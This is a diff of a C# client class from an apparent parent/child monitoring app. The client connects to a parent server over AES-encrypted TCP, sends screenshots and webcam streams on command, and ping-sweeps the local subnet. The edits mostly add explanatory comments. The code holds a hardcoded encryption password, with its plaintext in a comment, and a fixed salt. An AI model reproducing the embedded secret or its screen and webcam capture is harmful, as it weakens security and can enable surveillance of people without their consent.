@@ -5,9 +5,9 @@ using System.Diagnostics;
 using System.IO;
 using System.Linq;
 using System.Net;
-using System.Net.NetworkInformation;
-using System.Net.Sockets;
-using System.Security.Cryptography;
+using System.Net.NetworkInformation; //Provides access to network traffic data, network address information, and notification of address changes for the local computer. The namespace also contains classes that implement the Ping utility. You can use Ping and related classes to check whether a computer is reachable across the network.
+using System.Net.Sockets; //Precise control of network access
+using System.Security.Cryptography; //Provides cryptographic services
 using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
@@ -25,21 +25,15 @@ namespace Child
         private bool ConIsAlive = false;
         public event EventHandler<string> SignUpEventHandler;
         public event EventHandler<string> LoginEventHandler;
-        //
         //string Password = "@BridleAdmin0013579#AliLame_!^_^";
         string Password = "QEJyaWRsZUFkbWluMDAxMzU3OSNBbGlMYW1lXyFeX14="; // @BridleAdmin0013579#AliLame_!^_^
         byte[] PassBytes;
         private static List<Ping> pingers = new List<Ping>();
         private static int instances = 0;
-
         private static object @lock = new object();
-
         private static int result = 0;
         private static int timeOut = 250;
-
         private static int ttl = 5;
-        //
-
         public bool ConnectionIsAlive
         {
             get
@@ -79,7 +73,6 @@ namespace Child
         string[] Ports;
         string IdentifyResult;
         List<DataTable> SendTablesList;
-        //List<DataTable> ReciveTablesList;
         List<string> RecivedMessages;
         List<int> RecivedMessagesIndex;
         int Recived = 0;
@@ -92,7 +85,6 @@ namespace Child
         public NetworkStream STWebCam;
         public string Result = "OK";
         string ParentID = "";
-
         public ConnectionClass(string PortNumber, string IP, int SendBuffer, int NumberOfTables)
         {
             Ports = PortNumber.Split(',');
@@ -102,16 +94,16 @@ namespace Child
             //this.IP = IP;
             SingSM = new Semaphore(1, 1);
             ReciveData = new byte[SendBuffer];
-            ChildSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
+            ChildSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);//This example creates a socket that can be used to communicate on a TCP / IP based network such as the Internet.
             ChildFileSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
-            int Port = Convert.ToInt32(Ports[0]);
-            ChildSocket.BeginConnect(IP, Port, ConnectEvent, ChildSocket);
+            int Port = Convert.ToInt32(Ports[0]); //Converts a specified value to a 32-bit signed integer.
+            ChildSocket.BeginConnect(IP, Port, ConnectEvent, ChildSocket);//Begins an asynchronous request for a remote host connection.
             this.SendBuffer = SendBuffer;
             SendDataSM = new Semaphore(1, 1);
             ReciveSM = new Semaphore(1, 1);
             SM1 = new Semaphore(1, 1);
             SM2 = new Semaphore(1, 1);
-            PassBytes = Convert.FromBase64String(Password);
+            PassBytes = Convert.FromBase64String(Password);//Converts the specified string, which encodes binary data as base-64 digits, to an equivalent 8-bit unsigned integer array.
             Parents = new List<ChildClass>();
             SendTablesList = new List<DataTable>();
             for (int i = 0; i < NumberOfTables; i++)
@@ -176,7 +168,7 @@ namespace Child
         {
             try
             {
-                Thread.Sleep(500);
+                Thread.Sleep(500); //Suspends the current thread for the specified amount of time.
                 ChildFileSocket.EndConnect(ar);
 
                 SendIdentifyFileData(Form1.DS.Tables["Data"].Rows[2]["DataContent"].ToString(), Form1.DS.Tables["Data"].Rows[3]["DataContent"].ToString());
@@ -199,7 +191,6 @@ namespace Child
                 SendDataSM.WaitOne();
                 if (Form1.DS.Tables["Data"].Rows[5]["DataContent"].ToString() == "0")
                 {
-                    //SingSM.WaitOne();
                     Packet.ChildSingup Sing = new Packet.ChildSingup();
                     Sing.ID = Form1.DS.Tables["Data"].Rows[2]["DataContent"].ToString();
                     Sing.Parents = Form1.DS.Tables["Data"].Rows[3]["DataContent"].ToString();
@@ -208,7 +199,7 @@ namespace Child
                     ProSing.ID = Sing.ID;
                     ProSing.Type = (short)Packet.PacketType.ChildSingup;
                     string Data = Pack.ToString(Sing);
-                    ProSing.TotalSize = Encoding.Unicode.GetBytes(Data).Length;
+                    ProSing.TotalSize = Encoding.Unicode.GetBytes(Data).Length;// encodes a set of characters into a sequence of bytes.
                     string ProData = Pack.ToString(ProSing);
                     Packet.MainPacket MPacket = new Packet.MainPacket();
                     MPacket.PPacket = ProData;
@@ -223,8 +214,6 @@ namespace Child
                         Form1.DS.Tables["Data"].Rows[5].BeginEdit();
                         Form1.DS.Tables["Data"].Rows[5]["DataContent"] = "1";
                         Form1.DS.Tables["Data"].Rows[5].EndEdit();
-                        //Form1.DS.Tables["Data"].Rows.RemoveAt(5);
-                        //Form1.DS.Tables["Data"].Rows.InsertAt(Row, 5);
                         Form1.DataBaseAgent.UpdateData(Form1.DS.Tables["Data"]);
                         SendIdentifyData(Form1.DS.Tables["Data"].Rows[2]["DataContent"].ToString(), Form1.DS.Tables["Data"].Rows[3]["DataContent"].ToString());
                         ReciveData = new byte[ReciveData.Length];
@@ -238,13 +227,12 @@ namespace Child
                             try
                             {
                                 ChildFileSocket.BeginConnect(IP, 8803, ConnectFileEvent, ChildFileSocket);
-                                //ChildFileSocket.Connect(IP, Port);
                                 ConnectionIsAlive = true;
                                 PreapringRecive();
                             }
                             catch (Exception E)
                             {
-                                //ChildFileSocket.BeginConnect(IP, Port, ConnectFileEvent, ChildSocket);
+                               
                             }
 
                         }
@@ -266,11 +254,10 @@ namespace Child
                 }
                 else
                 {
-                    Thread.Sleep(100);
+                    Thread.Sleep(100);//Suspends the current thread for the specified amount of time.
                     SendIdentifyData(Form1.DS.Tables["Data"].Rows[2]["DataContent"].ToString(), Form1.DS.Tables["Data"].Rows[3]["DataContent"].ToString());
                     ReciveData = new byte[ReciveData.Length];
                     int Number = ChildSocket.Receive(ReciveData);
-                    //Array.Resize(ref ReciveData, Number);
                     IdentifyResult = Encoding.Unicode.GetString(AES_Decrypt( ReciveData.Take(Number).ToArray(), PassBytes));
                     IdentifyResult = IdentifyResult.Replace("\0", "");
                     if (IdentifyResult == "True")
@@ -284,7 +271,7 @@ namespace Child
                         }
                         catch (Exception E)
                         {
-                            //ChildFileSocket.BeginConnect(IP, Port, ConnectFileEvent, ChildSocket);
+                            
                         }
 
                     }
@@ -305,9 +292,7 @@ namespace Child
                 if (e.SocketErrorCode == SocketError.ConnectionReset)
                 {
                     ConnectionIsAlive = false;
-                    //ChildSocket.Shutdown(SocketShutdown.Both);
                     ChildSocket.Disconnect(true);
-                    //SingSM.Release();
 
                 }
                 else
@@ -322,11 +307,6 @@ namespace Child
             {
 
                 ConnectionIsAlive = false;
-                //if(ChildSocket.Connected == false)
-                //{
-                //    //ResetConnection();
-                //}
-
             }
         }
 
@@ -336,21 +316,16 @@ namespace Child
             Packet.ChildIdentify Identify = new Packet.ChildIdentify();
             Identify.ID = ID;
             this.ID = ID;
-
-            //Identify.Password = Password;
             Identify.Parent = Parent;
             Packet.ProPacket ProPack = new Packet.ProPacket();
             ProPack.Type = (short)Packet.PacketType.Identify;
             string Data = Pack.ToString(Identify);
             ProPack.TotalSize = Encoding.Unicode.GetBytes(Data).Length;
             ProPack.ID = ID;
-            //SendDataSM.WaitOne();
             Packet.MainPacket MPacket = new Packet.MainPacket();
             MPacket.PPacket = Pack.ToString(ProPack);
             MPacket.Data = Data;
             SendToServer(Pack.ToString(MPacket));
-            //SendDataSM.Release();
-            //ChildSocket.BeginReceive(ReciveData, 0, ReciveData.Length, SocketFlags.None, RecivedIdentify, ChildSocket);
         }
 
         public void SendIdentifyFileData(string ID, string Parent)
@@ -359,7 +334,6 @@ namespace Child
             Packet.ChildIdentify Identify = new Packet.ChildIdentify();
             Identify.ID = ID;
             this.ID = ID;
-            //Identify.Password = Password;
             Identify.Parent = Parent;
             Packet.ProPacket ProPack = new Packet.ProPacket();
             ProPack.Type = (short)Packet.PacketType.Identify;
@@ -367,12 +341,8 @@ namespace Child
             ProPack.TotalSize = Encoding.Unicode.GetBytes(Data).Length;
             ProPack.ID = ID;
             SendDataSM.WaitOne();
-            //Thread.Sleep(1000);
             SendFIleToServer(Pack.ToString(ProPack));
-            //Thread.Sleep(500);
-            //SendFIleToServer(Data);
             SendDataSM.Release();
-            //ChildSocket.BeginReceive(ReciveData, 0, ReciveData.Length, SocketFlags.None, RecivedIdentify, ChildSocket);
         }
 
         public void PreapringRecive()
@@ -399,9 +369,7 @@ namespace Child
                 ReciveSM.WaitOne();
 
                 string Message  = Encoding.Unicode.GetString(AES_Decrypt(ReciveData.Take(Recived).ToArray(), PassBytes));
-                //string Message = Encoding.Unicode.GetString(ReciveData);
                 ReciveData = new byte[ReciveData.Length];
-                //ChildSocket.BeginReceive(ReciveData, 0, ReciveData.Length, SocketFlags.None, RecivedOther, ChildSocket);
                 ReciveSM.Release();
                 if (IsStart == true)
                 {
@@ -410,30 +378,22 @@ namespace Child
                     SM1.WaitOne();
                     SM2.WaitOne();
                     ProPack = Message.Replace("\0", "");
-                    //RecivedMessages.Remove(RecivedMessages.First());
                     PacketData = "";
                     Data = Pack.ToPacket<Packet.ProPacket>(ProPack);
                     SM2.Release();
                     SM1.Release();
                     RemainingData = Data.TotalSize;
                     Type = Data.Type;
-                    //Child.EndReceive(ar);
-                    //Child.BeginReceive(ReciveData, 0, ReciveData.Length, SocketFlags.None, ReciveISG, Child);
-                    //ProPack = Encoding.Unicode.GetString(ReciveData);
-                    //ReciveSM.Release();
                     ChildSocket.Receive(ReciveData);
 
                 }
                 else
                 {
-                    //ReciveSM.WaitOne();
                     SM2.WaitOne();
                     PacketData += Encoding.Unicode.GetString(ReciveData);
-                    //RecivedMessages.Remove(RecivedMessages.First());
                     SM2.Release();
                     PacketData = PacketData.Replace("\0", "");
                     RemainingData -= Recived;
-                    //ReciveSM.Release();
                     if (RemainingData == 0)
                     {
                         IsStart = true;
@@ -462,8 +422,8 @@ namespace Child
         {
             byte[] encryptedBytes = null;
 
-            // Set your salt here, change it to meet your flavor:
-            // The salt bytes must be at least 8 bytes.
+            /*Set your salt here, change it to meet your flavor:
+             The salt bytes must be at least 8 bytes.*/
             byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8, 68, 17, 95, 61, 13, 83, 107, 111 };
 
             using (MemoryStream ms = new MemoryStream())
@@ -475,7 +435,7 @@ namespace Child
                     var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
                     AES.Key = key.GetBytes(32);
                     AES.IV = key.GetBytes(32);
-                    AES.Padding = PaddingMode.Zeros;
+                    AES.Padding = PaddingMode.Zeros;//Specifies the type of padding to apply when the message data block is shorter than the full number of bytes needed for a cryptographic operation.The padding string consists of bytes set to zero.
                     AES.Mode = CipherMode.CBC;
 
                     using (var cs = new CryptoStream(ms, AES.CreateEncryptor(AES.Key, AES.IV), CryptoStreamMode.Write))
@@ -525,10 +485,6 @@ namespace Child
 
         public void SendToServer(string Data)
         {
-            //Task.Run(() =>
-            //{
-            //    
-            //});
             try
             {
                 byte[] ByteData = Encoding.Unicode.GetBytes(Data);
@@ -553,7 +509,6 @@ namespace Child
 
             }
 
-            //SendDataSM.Release();
         }
 
         public void SendFIleToServer(string Data)
@@ -564,11 +519,6 @@ namespace Child
                 int Counter = 0;
                 ByteData = AES_Encrypt(ByteData, PassBytes);
                 Counter = ChildFileSocket.Send(ByteData);
-                //while (ByteData.Length != Counter)
-                //{
-                //    Counter += ChildFileSocket.Send(ByteData, Counter, SendBuffer, SocketFlags.None);
-                //}
-
             }
             catch (SocketException E)
             {
@@ -585,7 +535,6 @@ namespace Child
                 ReciveSM.WaitOne();
                 RecivedMessagesIndex.Add(Recived);
                 RecivedMessages.Add(Encoding.Unicode.GetString(AES_Decrypt(ReciveData.Take(Recived).ToArray(), PassBytes)));
-                //RecivedMessages.Add(Encoding.Unicode.GetString(ReciveData));
                 ReciveData = new byte[ReciveData.Length];
                 ReciveSM.Release();
                 ChildSocket.BeginReceive(ReciveData, 0, ReciveData.Length, SocketFlags.None, RecivedOther, ChildSocket);
@@ -619,10 +568,6 @@ namespace Child
                     {
                         if (true)
                         {
-                            //IsStart = false;
-
-
-
                             Packet.MainPacket Data;
                             Packet Pack = new Packet();
                             string IncommingData = "";
@@ -654,19 +599,6 @@ namespace Child
 
                             }
                         }
-                        //else
-                        //{
-                        //    Packet Pack = new Packet();
-                        //    PacketData += RecivedMessages.First().Replace("\0", "");
-                        //    RecivedMessages.Remove(RecivedMessages.First());
-                        //    string ID = ParentID;
-                        //    RemainingData -= RecivedMessagesIndex.First();
-                        //    RecivedMessagesIndex.RemoveAt(0);
-                        //    IsStart = true;
-                        //    
-                        //    
-                        //    
-                        //}
                     }
                     if (RecivedMessages.Count == 0)
                     {
@@ -684,10 +616,6 @@ namespace Child
                 if (Type == 13)
                 {
                     SC = new ScreenShotClass();
-                    //System.Timers.Timer Slice = new System.Timers.Timer(38);
-                    //ParentTCP = new TcpClient();
-                    //ParentTCP.Connect("127.0.0.1", 8803);
-                    //NetworkStream ST = ParentTCP.GetStream();
                     byte[] PicData = null;
                     string Pic = SC.FullScreenShot(1, ref PicData);
                     Packet Pack = new Packet();
@@ -697,13 +625,6 @@ namespace Child
                     SCPack.Type = (short)Packet.ScrrenShotType.OneTime;
                     SCPack.Header = "";
                     SCPack.End = DateTime.Now;
-                    //TcpClient SenderChient = new TcpClient();
-                    //SenderChient.Client = ChildFileSocket;
-                    //NetworkStream NS = SenderChient.GetStream();
-                    //SCPack.Type = (short)Packet.ScrrenShotType.OneTime;
-                    //SCPack.Header = "";
-                    //SCPack.Start = DateTime.Now;
-                    //SCPack.End = SCPack.Start;
                     string Data = Pack.ToString(SCPack);
                     int A = Data.Length;
                     Packet.ProPacket ProData = new Packet.ProPacket();
@@ -714,10 +635,8 @@ namespace Child
                     if (ConnectionIsAlive == true)
                     {
                         SendFileDataSM.WaitOne();
-                        //NS.Write(Encoding.Unicode.GetBytes(ProDataStr) , 0, Encoding.Unicode.GetBytes(ProDataStr).Length);
                         SendFIleToServer(ProDataStr);
                         Thread.Sleep(500);
-                        //NS.Write(PicData, 0, PicData.Length);
                         SendFIleToServer(Data);
                         SendFileDataSM.Release();
                     }
@@ -750,20 +669,13 @@ namespace Child
         public void Tester()
         {
             string baseIP = "192.168.";
-
-            //Console.WriteLine("Pinging 255 destinations of D-class in {0}*", baseIP);
-
             CreatePingers(255);
-
             PingOptions po = new PingOptions(ttl, true);
             System.Text.ASCIIEncoding enc = new System.Text.ASCIIEncoding();
             byte[] data = enc.GetBytes("abababababababababababababababab");
-
             SpinWait wait = new SpinWait();
             int cnt = 1;
-
             Stopwatch watch = Stopwatch.StartNew();
-
             foreach (Ping p in pingers)
             {
                 lock (@lock)
@@ -784,9 +696,6 @@ namespace Child
 
             DestroyPingers();
 
-            //Console.WriteLine("Finished in {0}. Found {1} active IP-addresses.", watch.Elapsed.ToString(), result);
-            //Console.ReadKey();
-
         }
 
         public void Ping_completed(object s, PingCompletedEventArgs e)
@@ -804,7 +713,6 @@ namespace Child
             }
             else
             {
-                //Console.WriteLine(String.Concat("Non-active IP: ", e.Reply.Address.ToString()))
             }
         }
 
@@ -844,14 +752,6 @@ namespace Child
                     string FindIP = "";
                     FindedIPs = new List<IPAddress>();
                     Tester();
-                    //IPHostEntry IPA = Dns.Resolve(IP);
-                    //foreach (IPAddress var in FindedIPs)
-                    //{
-                    //    if (("" + var.ToString()) == IP)
-                    //    {
-                    //        
-                    //    }
-                    //}
                     ParentTCP.Connect(IPAddress.Parse(IP), 8804);
                     ST = ParentTCP.GetStream();
                     byte[] PicData = null;
@@ -888,7 +788,6 @@ namespace Child
                     string FindIP = "";
                     FindedIPs = new List<IPAddress>();
                     Tester();
-                    //IPHostEntry IPA = Dns.Resolve(IP);
                     foreach (IPAddress var in FindedIPs)
                     {
                         if ((" " + var.ToString()) == IP)
@@ -898,7 +797,6 @@ namespace Child
                     }
                     STWebCam = ParentWebCamTCP.GetStream();
                     Form1.WebcamAgent.StartWebCam();
-
                 }
                 catch (SocketException E)
                 {
